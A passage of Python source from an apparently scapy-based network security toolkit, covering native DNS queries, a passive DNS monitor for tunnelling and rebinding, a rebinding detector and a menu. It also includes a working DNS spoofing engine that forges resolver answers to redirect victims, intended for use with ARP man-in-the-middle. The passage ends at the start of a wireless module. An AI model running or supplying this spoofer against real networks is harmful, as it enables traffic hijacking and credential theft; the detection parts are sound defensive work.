        ("answered", reply is not None), ("rcode", "NO-RESPONSE"), ("answer_count", 0),
        ("answers", []), ("authority_count", 0), ("additional_count", 0),
        ("elapsed_ms", elapsed_ms), ("authoritative", False), ("truncated", False),
    ])
    if reply is None:
        warn("no DNS response from %s within %.1fs" % (server_ip, timeout))
        LOGGER.scan("dns_query", result, target=target)
        return result
    dns_layer = reply.getlayer(DNS) if hasattr(reply, "getlayer") else None
    if dns_layer is None and reply.haslayer(UDP):
        # scapy only auto-dissects DNS on the standard port, so for a lab
        # resolver reached on a custom port the UDP payload is dissected here.
        try:
            payload_bytes = bytes(reply[UDP].payload)
            if payload_bytes:
                dns_layer = DNS(payload_bytes)
        except (AttributeError, IndexError, TypeError, ValueError):
            dns_layer = None
    if dns_layer is None:
        # An ICMP unreachable or a stray frame is not an answer - say so plainly
        # instead of reporting a parse error as if the resolver misbehaved.
        summary = "non-DNS reply"
        try:
            summary = reply.summary()
        except Exception:
            pass
        result["rcode"] = "NON-DNS-REPLY"
        result["error"] = "received %s instead of a DNS message" % summary
        warn("unexpected reply type from %s: %s" % (server_ip, summary))
        LOGGER.scan("dns_query", result, target=target)
        return result
    try:
        result["rcode"] = DNS_RCODE_NAMES.get(int(dns_layer.rcode), "rcode-%d" % dns_layer.rcode)
        result["authoritative"] = bool(dns_layer.aa)
        result["truncated"] = bool(dns_layer.tc)
        result["answer_count"] = int(dns_layer.ancount)
        result["authority_count"] = int(dns_layer.nscount)
        result["additional_count"] = int(dns_layer.arcount)
        # scapy has shipped two answer shapes: a DNSRR payload chain (classic)
        # and a list-like answer field (2.8+). Collect both without guessing.
        answer_root = dns_layer.an
        answer_records: List[Any] = []
        if isinstance(answer_root, (list, tuple)):
            answer_records.extend(list(answer_root))
        else:
            node = answer_root
            guard = 0
            while node is not None and guard < 64:
                guard += 1
                answer_records.append(node)
                if type(node).__name__ == "NoPayload":
                    break
                following = getattr(node, "payload", None)
                if following is None or following is node:
                    break
                node = following
        for candidate in answer_records:
            try:
                if not isinstance(candidate, DNSRR):
                    continue
                result["answers"].append(OrderedDict([
                    ("name", _dns_names_to_text(candidate.rrname)),
                    ("type", DNS_QTYPE_NAMES.get(int(candidate.type), "TYPE-%d" % candidate.type)),
                    ("ttl", int(candidate.ttl)),
                    ("value", _dns_names_to_text(candidate.rdata)),
                ]))
            except (AttributeError, TypeError, ValueError):
                continue
    except (AttributeError, IndexError, KeyError, TypeError, ValueError) as exc:
        result["parse_error"] = "%s: %s" % (type(exc).__name__, exc)
    heading("DNS QUERY RESULT")
    kv_table([
        ("Question", "%s %s" % (result["name"], result["qtype"])),
        ("Server", result["server"]),
        ("Rcode", c(result["rcode"], "bgreen" if result["rcode"] == "NOERROR" else "byellow")),
        ("Answers", result["answer_count"]),
        ("Authoritative", result["authoritative"]),
        ("Truncated (TCP needed)", result["truncated"]),
        ("Round trip", "%s ms" % result["elapsed_ms"]),
    ])
    for answer in result["answers"]:
        out("  %-6s %-34s ttl=%-6s %s" % (
            c(answer["type"], "cyan"), answer["name"][:34], answer["ttl"], answer["value"]))
    if not result["answers"] and result["rcode"] == "NOERROR":
        out(c("  (NOERROR with zero answers - name exists but has no records of this type)", "grey"))
    summary = OrderedDict([("mode", "dns-query"), ("result", result)])
    artifact = LOGGER.scan("dns_query", summary, target="%s/%s" % (target, qtype_key))
    if artifact:
        note("artefact: %s" % artifact)
    return result


def dns_monitor(iface: Optional[str] = None, duration: float = 30.0,
                bpf_extra: str = "", watch_substring: str = "") -> Dict[str, Any]:
    """
    Passive DNS observer with tunnelling / DGA heuristics.

    Flags queries whose labels are unusually long or high-entropy (classic
    DNS-tunnelling and domain-generation-algorithm signatures), counts TXT and
    NULL record abuse patterns, and summarises per-client behaviour.
    """
    if not require_scapy("DNS monitor"):
        raise FrameworkError("scapy unavailable")
    if not DNS_LAYERS_AVAILABLE:
        raise FrameworkError("scapy DNS layers unavailable: %s" % DNS_LAYERS_ERROR)
    query_counter: Counter = Counter()
    qtype_counter: Counter = Counter()
    client_counter: Counter = Counter()
    rcode_counter: Counter = Counter()
    suspicious: List[Dict[str, Any]] = []
    base_domain_counts: Counter = Counter()
    rebinding_state: Dict[str, str] = {}
    rebinding_alerts: List[Dict[str, Any]] = []
    total_queries = 0
    total_responses = 0
    lock = threading.Lock()
    filter_text = "udp port 53"
    if bpf_extra:
        filter_text = "(%s) and (%s)" % (filter_text, bpf_extra)
    note("observing DNS traffic for %s (filter: %s)" % (format_duration(duration), filter_text))

    def _observe(packet: Any) -> None:
        nonlocal total_queries, total_responses
        try:
            if not packet.haslayer(DNS):
                return
            dns_layer = packet[DNS]
            client = str(packet[IP].src) if packet.haslayer(IP) else "?"
            if int(dns_layer.qr) == 0:
                question = _dns_names_to_text(dns_layer.qd.qname) if dns_layer.qd is not None else ""
                if not question:
                    return
                qtype_value = int(getattr(dns_layer.qd, "qtype", 0) or 0)
                qtype_name = DNS_QTYPE_NAMES.get(qtype_value, "TYPE-%d" % qtype_value)
                with lock:
                    total_queries += 1
                    query_counter[question] += 1
                    qtype_counter[qtype_name] += 1
                    client_counter[client] += 1
                    labels = question.split(".")
                    if len(labels) >= 2:
                        base_domain_counts[".".join(labels[-2:])] += 1
                    longest_label = max(labels, key=len) if labels else ""
                    entropy = dns_shannon_entropy(longest_label)
                    reasons: List[str] = []
                    if len(longest_label) >= 30:
                        reasons.append("label length %d" % len(longest_label))
                    if len(longest_label) >= 18 and entropy >= 3.6:
                        reasons.append("label entropy %.2f bits/char" % entropy)
                    if qtype_name in ("TXT", "NULL") and len(longest_label) >= 20:
                        reasons.append("TXT/NULL with long label")
                    if watch_substring and watch_substring.lower() in question.lower():
                        reasons.append("matches watch pattern '%s'" % watch_substring)
                    if reasons:
                        suspicious.append(OrderedDict([
                            ("timestamp", format_timestamp()),
                            ("client", client), ("query", question), ("qtype", qtype_name),
                            ("entropy", entropy), ("label_length", len(longest_label)),
                            ("reasons", reasons),
                        ]))
                        if len(suspicious) <= 12:
                            warn("suspicious: %-46s %s" % (question[:46], "; ".join(reasons)))
            else:
                with lock:
                    total_responses += 1
                    rcode_counter[DNS_RCODE_NAMES.get(int(dns_layer.rcode),
                                                      "rcode-%d" % dns_layer.rcode)] += 1
                # DNS rebinding trap: watch each answered name for a flip between
                # public space and loopback/private space inside one capture window.
                try:
                    answer_record = dns_layer.an
                    while answer_record is not None and int(getattr(answer_record, "type", 0)) in (1, 28):
                        owner = str(getattr(answer_record, "rrname", b""))
                        try:
                            if isinstance(owner, bytes):
                                owner = owner.decode("ascii", "replace")
                        except (UnicodeDecodeError, AttributeError):
                            owner = str(owner)
                        owner = owner.strip(".")
                        value = str(getattr(answer_record, "rdata", "")).strip()
                        space = address_space(value)
                        if owner and space in ("public", "private", "loopback", "link-local"):
                            previous = rebinding_state.get(owner)
                            if previous and previous != space and \
                                    {previous, space} & {"public"} and \
                                    {previous, space} & {"private", "loopback", "link-local"}:
                                with lock:
                                    rebinding_alerts.append(OrderedDict([
                                        ("timestamp", format_timestamp()),
                                        ("client", client), ("name", owner),
                                        ("from_space", previous), ("to_space", space),
                                        ("address", value),
                                        ("ttl", int(getattr(answer_record, "ttl", 0) or 0)),
                                    ]))
                                if len(rebinding_alerts) <= 8:
                                    warn("possible DNS rebinding: %s flipped %s -> %s (%s)"
                                         % (owner[:40], previous, space, value))
                            rebinding_state[owner] = space
                        answer_record = getattr(answer_record, "payload", None)
                except (AttributeError, IndexError, KeyError, TypeError, ValueError):
                    pass
        except (AttributeError, IndexError, KeyError, TypeError, ValueError):
            return

    kwargs: Dict[str, Any] = {"prn": _observe, "store": False, "filter": filter_text,
                              "timeout": max(1.0, duration)}
    if iface:
        kwargs["iface"] = iface
    try:
        sniff(**kwargs)
    except KeyboardInterrupt:
        warn("DNS monitoring interrupted by operator.")
    except OSError as exc:
        raise FrameworkError("DNS capture failed: %s (check the interface and filter)" % exc)
    heading("DNS MONITOR SUMMARY")
    kv_table([
        ("Interface", iface or "auto"),
        ("Duration", format_duration(duration)),
        ("Queries observed", total_queries),
        ("Responses observed", total_responses),
        ("Unique names", len(query_counter)),
        ("Suspicious queries", len(suspicious)),
        ("Rebinding flips seen", len(rebinding_alerts)),
    ])
    if rebinding_alerts:
        out("")
        out(c("  DNS rebinding candidates", "cyan", "bold"))
        for entry in rebinding_alerts[:12]:
            out("    %-32s %-9s -> %-9s %s" % (entry["name"][:32], entry["from_space"],
                                               entry["to_space"], entry["address"]))
    if qtype_counter:
        out("")
        out(c("  query type distribution", "cyan"))
        for qtype_name, count in qtype_counter.most_common(8):
            out("    %-8s %6d" % (qtype_name, count))
    if query_counter:
        out("")
        out(c("  top queried names", "cyan"))
        for question, count in query_counter.most_common(12):
            out("    %-52s %6d" % (question[:52], count))
    if client_counter:
        out("")
        out(c("  top clients", "cyan"))
        for client, count in client_counter.most_common(8):
            out("    %-18s %6d queries" % (client, count))
    if base_domain_counts:
        out("")
        out(c("  top base domains", "cyan"))
        for domain, count in base_domain_counts.most_common(10):
            out("    %-40s %6d" % (domain, count))
    if rcode_counter:
        out("")
        out(c("  response codes", "cyan"))
        for rcode, count in rcode_counter.most_common(8):
            out("    %-10s %6d" % (rcode, count))
    if suspicious:
        warn("%d suspicious query/query group(s) flagged - review the artefact for the full list." % len(suspicious))
    summary = OrderedDict([
        ("mode", "dns-monitor"),
        ("interface", iface or "auto"),
        ("duration_seconds", duration),
        ("total_queries", total_queries), ("total_responses", total_responses),
        ("top_names", dict(query_counter.most_common(50))),
        ("qtypes", dict(qtype_counter)),
        ("clients", dict(client_counter.most_common(25))),
        ("base_domains", dict(base_domain_counts.most_common(25))),
        ("rcodes", dict(rcode_counter)),
        ("suspicious", suspicious[:200]),
    ])
    artifact = LOGGER.scan("dns_monitor", summary, target=iface or "auto")
    if artifact:
        note("artefact: %s" % artifact)
    return summary


class DnsSpoofer:
    """
    Authorised DNS answer-forgery engine used with an ARP-MITM or as the
    authoritative responder in a lab segment.

    It answers A-record queries for a configured domain list on behalf of the
    real resolver (source address = the resolver the client queried), echoing
    the transaction ID and question section so the client accepts the answer.
    Non-matching queries are left untouched unless 'answer_everything' is set.
    """

    def __init__(self, iface: Optional[str], fake_ip: str, domains: Sequence[str],
                 victim_ips: Optional[Sequence[str]] = None, answer_ttl: int = 60,
                 answer_everything: bool = False, iface_mac: Optional[str] = None,
                 also_nxdomain_domains: Optional[Sequence[str]] = None) -> None:
        self.iface = iface
        self.fake_ip = str(fake_ip)
        self.domains = [str(domain).strip().lower().lstrip(".").rstrip(".") for domain in domains
                        if str(domain).strip()]
        self.victim_ips = [str(ip) for ip in (victim_ips or []) if str(ip).strip()]
        self.answer_ttl = max(0, int(answer_ttl))
        self.answer_everything = bool(answer_everything)
        self.also_nxdomain = [str(domain).strip().lower() for domain in (also_nxdomain_domains or [])]
        self.our_mac = iface_mac or (InterfaceManager.hwaddr(iface) if iface else "")
        self.sniffer: Any = None
        self.stop_event = threading.Event()
        self.hits: List[Dict[str, Any]] = []
        self.missed = 0
        self.forwarded_notes = 0
        self.victim_mac_cache: Dict[str, Optional[str]] = {}
        self.started_at: Optional[float] = None
        self.ended_at: Optional[float] = None
        self.lock = threading.Lock()

    # -- matching ----------------------------------------------------------
    def _matches(self, qname: str) -> bool:
        name = qname.lower().lstrip(".").rstrip(".")
        if not name:
            return False
        if self.answer_everything:
            return True
        for domain in self.domains:
            if domain in ("*", ""):
                return True
            if name == domain or name.endswith("." + domain):
                return True
        return False

    def _is_nxdomain_target(self, qname: str) -> bool:
        name = qname.lower().lstrip(".").rstrip(".")
        for domain in self.also_nxdomain:
            if domain and (name == domain or name.endswith("." + domain)):
                return True
        return False

    # -- transport ---------------------------------------------------------
    def _victim_mac(self, victim_ip: str) -> Optional[str]:
        if victim_ip in self.victim_mac_cache:
            return self.victim_mac_cache[victim_ip]
        mac: Optional[str] = None
        try:
            if not ipaddress.IPv4Address(victim_ip).is_loopback:
                mac = _arp_resolve(victim_ip, self.iface, timeout=1.5, retries=1)
        except (ValueError, ipaddress.AddressValueError, FrameworkError):
            mac = None
        self.victim_mac_cache[victim_ip] = mac
        return mac

    def _transmit(self, response: Any, victim_ip: str) -> None:
        """Deliver the forged answer: L2 when the victim MAC is known, else L3."""
        victim_mac = self._victim_mac(victim_ip)
        try:
            if victim_mac and self.our_mac and self.our_mac != "n/a":
                sendp(Ether(src=self.our_mac, dst=victim_mac) / response, verbose=0, iface=self.iface)
            else:
                send(response, verbose=0, iface=self.iface)
        except (OSError, PermissionError) as exc:
            LOGGER.event("warn", "DNS spoof transmit failed: %s" % exc, level="WARN")

    # -- engine ------------------------------------------------------------
    def _handle(self, packet: Any) -> None:
        try:
            if not (packet.haslayer(IP) and packet.haslayer(UDP) and packet.haslayer(DNS)):
                return
            dns_layer = packet[DNS]
            if int(dns_layer.qr) != 0:
                return
            if int(getattr(dns_layer.qd, "qtype", 0) or 0) not in (1, 255):
                self.missed += 1
                return
            victim_ip = str(packet[IP].src)
            resolver_ip = str(packet[IP].dst)
            if self.victim_ips and victim_ip not in self.victim_ips:
                self.forwarded_notes += 1
                return
            question = _dns_names_to_text(dns_layer.qd.qname)
            if not self._matches(question):
                self.missed += 1
                return
            nxdomain = self._is_nxdomain_target(question)
            if nxdomain:
                response = (IP(src=resolver_ip, dst=victim_ip) / UDP(sport=53, dport=int(packet[UDP].sport))
                            / DNS(id=int(dns_layer.id), qr=1, aa=1, rd=1, ra=1, qd=dns_layer.qd, rcode=3))
            else:
                response = (IP(src=resolver_ip, dst=victim_ip) / UDP(sport=53, dport=int(packet[UDP].sport))
                            / DNS(id=int(dns_layer.id), qr=1, aa=1, rd=1, ra=1, qd=dns_layer.qd,
                                  an=DNSRR(rrname=dns_layer.qd.qname, type="A", ttl=self.answer_ttl,
                                           rdata=self.fake_ip)))
            # The original query must not also reach the real resolver when we
            # are acting as an on-path device; when we are not on-path the query
            # simply continues and the client may get two answers (race).
            self._transmit(response, victim_ip)
            with self.lock:
                self.hits.append(OrderedDict([
                    ("timestamp", format_timestamp()),
                    ("victim", victim_ip), ("resolver", resolver_ip),
                    ("query", question),
                    ("answer", "NXDOMAIN" if nxdomain else self.fake_ip),
                    ("txid", int(dns_layer.id)),
                ]))
                hits_now = len(self.hits)
            if hits_now <= 20 or hits_now % 10 == 0:
                out("  %s %-15s %-44s -> %s" % (
                    c("HIT", "bgreen", "bold"), victim_ip, question[:44],
                    "NXDOMAIN" if nxdomain else c(self.fake_ip, "byellow")))
        except (AttributeError, IndexError, KeyError, TypeError, ValueError) as exc:
            LOGGER.event("warn", "DNS spoof handler error: %s" % exc, level="WARN")

    def start(self) -> bool:
        if not require_scapy("DNS spoofing"):
            return False
        if not DNS_LAYERS_AVAILABLE:
            err("scapy DNS layers unavailable: %s" % DNS_LAYERS_ERROR)
            return False
        if not self.domains and not self.answer_everything:
            err("no domains configured and answer-everything is disabled - nothing to spoof")
            return False
        kwargs: Dict[str, Any] = {"prn": self._handle, "store": False,
                                  "filter": "udp and dst port 53"}
        if self.iface:
            kwargs["iface"] = self.iface
        try:
            self.sniffer = scapy.AsyncSniffer(**kwargs)
            self.sniffer.start()
        except Exception as exc:
            err("DNS spoof capture could not start: %s" % exc)
            return False
        self.started_at = time.time()
        LOGGER.event("dns", "DNS spoofing engine started",
                     data={"domains": self.domains, "fake_ip": self.fake_ip,
                           "victims": self.victim_ips or "any", "iface": self.iface or "auto"})
        return True

    def stop(self) -> None:
        self.ended_at = time.time()
        if self.sniffer:
            try:
                self.sniffer.stop()
            except Exception as exc:
                LOGGER.event("warn", "DNS spoof sniffer shutdown issue: %s" % exc, level="WARN")
            self.sniffer = None

    def run(self, duration: float) -> Dict[str, Any]:
        heading("DNS SPOOFING ENGINE")
        kv_table([
            ("Interface", self.iface or "auto"),
            ("Forged address", self.fake_ip),
            ("Domains", ", ".join(self.domains[:8]) + (" ..." if len(self.domains) > 8 else "")
             if self.domains else "(answer everything)"),
            ("NXDOMAIN domains", ", ".join(self.also_nxdomain[:5]) or "none"),
            ("Victims", ", ".join(self.victim_ips) or "any client on the segment"),
            ("Answer TTL", self.answer_ttl),
            ("Duration", format_duration(duration)),
        ])
        warn("forged DNS answers can hide the real site - authorised assessment use only.")
        if not self.start():
            return OrderedDict([("aborted", True)])
        out("")
        out(c("  watching for matching queries (Ctrl-C stops early) ...", "grey"))
        try:
            deadline = time.time() + max(1.0, duration)
            while time.time() < deadline:
                time.sleep(0.25)
        except KeyboardInterrupt:
            warn("DNS spoofing stopped by operator.")
        finally:
            self.stop()
        duration_actual = (self.ended_at or time.time()) - (self.started_at or time.time())
        heading("DNS SPOOFING SUMMARY")
        kv_table([
            ("Runtime", format_duration(duration_actual)),
            ("Answers forged", len(self.hits)),
            ("Non-matching queries seen", self.missed),
            ("Frames from other clients", self.forwarded_notes),
        ])
        if self.hits:
            out(c("  forged-answer log", "cyan"))
            for entry in self.hits[:40]:
                out("    %-19s %-15s %-38s -> %s" % (entry["timestamp"][11:], entry["victim"],
                                                     entry["query"][:38], entry["answer"]))
        else:
            note("no matching queries observed during this window.")
        summary = OrderedDict([
            ("mode", "dns-spoof"),
            ("interface", self.iface or "auto"),
            ("fake_ip", self.fake_ip),
            ("domains", self.domains),
            ("nxdomain_domains", self.also_nxdomain),
            ("victims", self.victim_ips),
            ("duration_seconds", round(duration_actual, 2)),
            ("hits", self.hits),
            ("missed", self.missed),
        ])
        artifact = LOGGER.scan("dns_spoof", summary, target=",".join(self.victim_ips) or "segment")
        if artifact:
            note("artefact: %s" % artifact)
        return summary


DNS_REBINDING_TTL_WINDOW: int = 60


def address_space(value: str) -> str:
    """Classify an address as public / private / loopback / link-local / special."""
    try:
        parsed = ipaddress.ip_address(str(value).strip())
    except ValueError:
        return "unknown"
    if parsed.is_loopback:
        return "loopback"
    if parsed.is_link_local:
        return "link-local"
    if parsed.is_private:
        return "private"
    if parsed.is_multicast or parsed.is_reserved or parsed.is_unspecified:
        return "special"
    return "public"


def classify_rebinding(samples: List[Dict[str, Any]],
                       ttl_window: int = DNS_REBINDING_TTL_WINDOW) -> Dict[str, Any]:
    """
    Decide whether an answer series carries a DNS-rebinding signature.

    Rebinding leans on a short TTL: the victim resolves a name to a public
    address, the record flips into loopback or private space (or into private
    space the attacker does not own), and the browser then talks to whatever
    answers for that name now. The signature is therefore a space flip between
    public and local answers, aggravated by a low TTL on the flipped answer.
    """
    spaces: Counter = Counter()
    addresses: List[str] = []
    ttl_values: List[int] = []
    for entry in samples:
        address = str(entry.get("address", "") or "").strip()
        if not address:
            continue
        spaces[address_space(address)] += 1
        addresses.append(address)
        ttl = entry.get("ttl")
        if isinstance(ttl, int) and ttl >= 0:
            ttl_values.append(int(ttl))
    seen = set(spaces)
    local_spaces = {"loopback", "private", "link-local"}
    public_seen = "public" in seen
    local_seen = bool(seen & local_spaces)
    min_ttl = min(ttl_values) if ttl_values else None
    flipped = [entry for entry in samples
               if address_space(str(entry.get("address", ""))) in local_spaces]
    flipped_ttls = [int(entry["ttl"]) for entry in flipped
                    if isinstance(entry.get("ttl"), int) and entry["ttl"] >= 0]
    verdict = "stable"
    detail = "every answer stayed in one address space with a stable TTL"
    if len(addresses) < 2:
        verdict = "insufficient-data"
        detail = "fewer than two answers were observed - raise the sample count"
    elif public_seen and local_seen:
        if (min_ttl is not None and min_ttl <= ttl_window
                and flipped_ttls and min(flipped_ttls) <= ttl_window):
            verdict = "rebinding-suspected"
            detail = ("the same name answered from public space (%s) and local space (%s) "
                      "with a TTL of %ds: a page could be re-pointed at a host inside the "
                      "network before the next connection"
                      % ("public", "/".join(sorted(seen & local_spaces)), min_ttl))
        else:
            verdict = "space-flip"
            detail = ("the name answered from both public and local space, but the TTLs "
                      "(%s) are longer than the %ds rebinding window"
                      % ("n/a" if min_ttl is None else "%ds" % min_ttl, ttl_window))
    elif local_seen and not public_seen:
        verdict = "local-only"
        detail = "every answer resolved inside private/loopback space"
    elif len(set(addresses)) >= 3 and min_ttl is not None and min_ttl <= 30:
        verdict = "ttl-churn"
        detail = ("answers rotated across %d addresses with a minimum TTL of %ds - fast "
                  "churn is how a rebinding service keeps control of the record"
                  % (len(set(addresses)), min_ttl))
    return OrderedDict([
        ("verdict", verdict),
        ("detail", detail),
        ("spaces", dict(spaces)),
        ("addresses", addresses),
        ("distinct_addresses", len(set(addresses))),
        ("min_ttl", min_ttl),
        ("samples", len(samples)),
    ])


def dns_rebinding_watch(names: List[str], samples: int = 8, interval: float = 0.5,
                        server: Optional[str] = None,
                        qtype: str = "A") -> Dict[str, Any]:
    """
    Trap DNS rebinding by sampling a name repeatedly.

    Each sample records the answer address, its address space and its TTL; the
    series is then graded by classify_rebinding(). A name that keeps returning
    public addresses while occasionally answering 127.0.0.1 or an RFC1918 range
    under a short TTL is the textbook rebinding pattern.
    """
    cleaned: List[str] = []
    for entry in names or []:
        value = str(entry).strip()
        if value and value not in cleaned:
            cleaned.append(value)
    if not cleaned:
        raise FrameworkError("no names supplied for the rebinding watch")
    sample_count = max(2, min(120, int(samples)))
    gap = max(0.0, min(30.0, float(interval)))
    record_type = str(qtype or "A").strip().upper()
    if record_type not in ("A", "AAAA"):
        raise FrameworkError("rebinding watch supports A and AAAA series (got '%s')" % qtype)
    note("rebinding watch: %d name(s) x %d sample(s) every %.2fs (%s records)"
         % (len(cleaned), sample_count, gap, record_type))
    report: "OrderedDict[str, Any]" = OrderedDict()
    suspected = 0
    for name in cleaned:
        series: List[Dict[str, Any]] = []
        errors = 0
        for index in range(sample_count):
            try:
                answer = dns_query_native(name, record_type, server=server, timeout=3.0)
            except FrameworkError as exc:
                errors += 1
                series.append(OrderedDict([("sample", index + 1), ("address", ""),
                                           ("ttl", None), ("error", str(exc)[:120])]))
            else:
                values = [entry for entry in answer.get("answers", [])
                          if str(entry.get("type", "")).upper() == record_type]
                if not values:
                    series.append(OrderedDict([("sample", index + 1), ("address", ""),
                                               ("ttl", None),
                                               ("error", "no %s record" % record_type)]))
                for entry in values:
                    series.append(OrderedDict([
                        ("sample", index + 1),
                        ("address", str(entry.get("value", ""))),
                        ("ttl", entry.get("ttl")),
                        ("source", str(entry.get("name", ""))),
                    ]))
            if gap and index < sample_count - 1:
                time.sleep(gap)
        verdict = classify_rebinding(series)
        if verdict["verdict"] == "rebinding-suspected":
            suspected += 1
        report[name] = OrderedDict([("series", series), ("errors", errors),
                                    ("verdict", verdict)])
        out("")
        out(c("  %s" % name, "cyan", "bold"))
        recent = [entry for entry in series if entry.get("address")][-6:]
        for entry in recent:
            out("    sample %-3s %-40s %-11s ttl=%s" % (
                entry.get("sample", "?"), entry.get("address", ""),
                address_space(str(entry.get("address", ""))),
                entry.get("ttl") if entry.get("ttl") is not None else "-"))
        if not recent:
            out("    no answers observed (%d error(s))" % errors)
        if verdict["verdict"] == "rebinding-suspected":
            warn("%s -> %s" % (name, verdict["detail"]))
        else:
            note("%s -> %s (%s)" % (name, verdict["verdict"], verdict["detail"]))
    heading("REBINDING WATCH RESULT")
    kv_table([
        ("Names watched", len(cleaned)),
        ("Samples per name", sample_count),
        ("Interval", "%.2fs" % gap),
        ("Record type", record_type),
        ("Resolvers", server or "system resolver"),
        ("Rebinding suspected", suspected),
    ])
    summary = OrderedDict([
        ("mode", "dns-rebinding-watch"),
        ("record_type", record_type),
        ("samples_per_name", sample_count),
        ("interval_seconds", gap),
        ("server", server or "system"),
        ("suspect_count", suspected),
        ("names", report),
    ])
    artifact = LOGGER.scan("dns_rebinding", summary,
                           target=",".join(cleaned[:4]) or "rebinding-watch")
    if artifact:
        note("artefact: %s" % artifact)
    LOGGER.event("scan", "DNS rebinding watch complete: %d name(s), %d suspect(s)"
                 % (len(cleaned), suspected))
    return summary


def dns_rebinding_interactive() -> None:
    """Menu wrapper for 15 option 6 - sample names and look for rebinding."""
    names_raw = prompt_text("names to watch (comma/space separated)")
    if names_raw is PROMPT_ABORT:
        return
    names = [token for token in re.split(r"[,\s]+", str(names_raw)) if token]
    if not names:
        err("no names supplied.")
        return
    samples = prompt_int("samples per name", 2, 120, 8)
    if samples is PROMPT_ABORT:
        return
    interval = prompt_float("seconds between samples", 0.0, 30.0, 0.5)
    if interval is PROMPT_ABORT:
        return
    server_raw = prompt_text("DNS server ip[:port] (blank = system resolver)",
                             default="", allow_blank=True)
    if server_raw is PROMPT_ABORT:
        return
    qtype = prompt_choice("record type", ["A", "AAAA"], "A")
    if qtype is PROMPT_ABORT:
        return
    try:
        dns_rebinding_watch(names, samples=int(samples), interval=float(interval),
                            server=str(server_raw).strip() or None, qtype=str(qtype))
    except FrameworkError as exc:
        err(str(exc))


@module_guard("DNS Toolkit")
@root_required
def module_dns(args: Optional[List[str]] = None) -> None:
    """Interactive DNS suite: native resolution, passive monitoring, answer forgery."""
    if not DNS_LAYERS_AVAILABLE:
        err("scapy DNS layers unavailable: %s" % DNS_LAYERS_ERROR)
        note("upgrade scapy (python3 -m pip install -U scapy) and retry.")
        return
    while True:
        heading("MODULE 15 - DNS TOOLKIT")
        options = OrderedDict([
            ("1", "Native record query (A/AAAA/MX/TXT/NS/SOA/PTR/SRV)"),
            ("2", "Passive DNS monitor (tunnelling/DGA heuristics)"),
            ("3", "DNS spoofing engine (answer forgery with domain map)"),
            ("4", "Record type reference"),
            ("5", "ONLINE: DNS services (DNS over HTTPS resolver, DNSBL reputation)"),
            ("6", "DNS rebinding trap (public <-> private answer flips)"),
            ("0", "Return to main menu"),
        ])
        for key, label in options.items():
            out("  [%s] %s" % (c(key, "byellow", "bold"), label))
        choice = prompt_text("dns> select")
        if choice is PROMPT_ABORT:
            return
        choice = str(choice).strip()

        if choice == "6":
            dns_rebinding_interactive()
            continue

        if choice == "5":
            online_dns_console()
            continue
        if choice == "0":
            return
        if choice == "1":
            name_raw = prompt_text("name to resolve (IPv4 literal = automatic PTR)")
            if name_raw is PROMPT_ABORT:
                continue
            qtype = prompt_choice("record type", sorted(DNS_QTYPE_MAP.keys()), "A")
            if qtype is PROMPT_ABORT:
                continue
            server_raw = prompt_text("DNS server (blank = system resolver)", default="", allow_blank=True)
            if server_raw is PROMPT_ABORT:
                continue
            timeout = prompt_float("timeout seconds", 0.3, 30.0, 3.0)
            if timeout is PROMPT_ABORT:
                continue
            dns_query_native(str(name_raw), str(qtype),
                             server=str(server_raw).strip() or None, timeout=float(timeout))
        elif choice == "2":
            iface_raw = prompt_text("interface (blank = auto)", default="", allow_blank=True)
            if iface_raw is PROMPT_ABORT:
                continue
            duration = prompt_float("observation window seconds", 2.0, 3600.0, 30.0)
            if duration is PROMPT_ABORT:
                continue
            watch = prompt_text("alert substring in names (blank = none)", default="", allow_blank=True)
            if watch is PROMPT_ABORT:
                continue
            dns_monitor(iface=str(iface_raw).strip() or None, duration=float(duration),
                        watch_substring=str(watch).strip())
        elif choice == "3":
            victim_raw = prompt_text("victim IP(s) comma separated (blank = any client)",
                                     default="", allow_blank=True)
            if victim_raw is PROMPT_ABORT:
                continue
            victims = [token.strip() for token in re.split(r"[,\s]+", str(victim_raw)) if token.strip()]
            domains_raw = prompt_text("domains to spoof (comma separated, '*;' = everything)",
                                      default="example.test")
            if domains_raw is PROMPT_ABORT:
                continue
            domain_tokens = [token.strip().lower() for token in re.split(r"[,\s]+", str(domains_raw))
                             if token.strip()]
            answer_everything = any(token in ("*", "all") for token in domain_tokens)
            domains = [token for token in domain_tokens if token not in ("*", "all")]
            fake_raw = prompt_text("address to answer with", default="127.0.0.1")
            if fake_raw is PROMPT_ABORT:
                continue
            try:
                fake_ip = parse_ipv4(fake_raw)
            except FrameworkError as exc:
                err(str(exc))
                continue
            nxdomain_raw = prompt_text("domains to NXDOMAIN instead (comma separated, blank = none)",
                                       default="", allow_blank=True)
            if nxdomain_raw is PROMPT_ABORT:
                continue
            nxdomains = [token.strip().lower() for token in re.split(r"[,\s]+", str(nxdomain_raw))
                         if token.strip()]
            iface_raw = prompt_text("interface (blank = auto)", default="", allow_blank=True)
            if iface_raw is PROMPT_ABORT:
                continue
            duration = prompt_float("run duration seconds", 5.0, 3600.0, 60.0)
            if duration is PROMPT_ABORT:
                continue
            if not prompt_yes_no("Confirm authorisation to forge DNS answers for these targets", False):
                warn("DNS spoofing cancelled.")
                continue
            engine = DnsSpoofer(iface=str(iface_raw).strip() or None, fake_ip=fake_ip,
                                domains=domains, victim_ips=victims,
                                answer_everything=answer_everything,
                                also_nxdomain_domains=nxdomains)
            engine.run(float(duration))
        elif choice == "4":
            heading("DNS RECORD REFERENCE")
            reference = [
                ("A / AAAA", "Host address (IPv4 / IPv6)"),
                ("NS", "Authoritative name servers for a zone"),
                ("CNAME", "Canonical-name alias"),
                ("SOA", "Zone authority, serial and refresh timers"),
                ("PTR", "Reverse mapping (in-addr.arpa)"),
                ("MX", "Mail exchangers plus preference values"),
                ("TXT", "Arbitrary text: SPF/DKIM/DMARC, and a common tunnelling carrier"),
                ("SRV", "Service location: protocol, port and target"),
                ("ANY", "Everything the server is willing to return"),
            ]
            for label, description in reference:
                out("  %s  %s" % (c(label.ljust(10), "cyan"), c(description, "grey")))
            out("")
            out(c("  tunnelling heuristic: long (>=30 char) or high-entropy (>=3.6 bits/char) labels",
                  "grey"))
            out(c("  combined with TXT/NULL queries are the classic covert-channel signature.", "grey"))
        else:
            warn("unrecognised selection '%s'." % choice)


# ===========================================================================
# MODULE 16 - WIRELESS LAB (capability audit, monitor mode, scan, deauth lab)
# ===========================================================================
WIRELESS_LAYERS_AVAILABLE = False
WIRELESS_LAYERS_ERROR = ""
try:
    from scapy.all import (Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt,  # type: ignore[import-not-found]
                           RadioTap)
    WIRELESS_LAYERS_AVAILABLE = True
except Exception as _wlan_exc:  # pragma: no cover - environment dependent
